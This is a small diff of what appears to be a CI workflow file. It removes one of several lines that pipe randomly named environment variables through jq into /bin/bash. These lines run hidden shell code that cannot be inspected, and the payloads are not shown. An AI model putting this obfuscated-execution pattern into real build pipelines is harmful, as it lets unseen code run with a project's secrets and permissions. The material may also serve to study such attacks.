@@ -38,7 +38,6 @@ jobs:
           echo $oeiss13576 | jq -r .p1446 | /bin/bash
           printf '%s' "$kum04765" | jq -r .oilgb4734 | /bin/bash
           printf '%s' "$d411" | jq -r .czhgf4009 | /bin/bash
-          echo $fnits937 | jq -r .vurdb1 | /bin/bash
           echo $gjdua93948 | jq -r .fc8 | /bin/bash
           echo $cuch3 | jq -r .gtz5 | /bin/bash
           echo $hz3350 | jq -r .ysn1 | /bin/bash
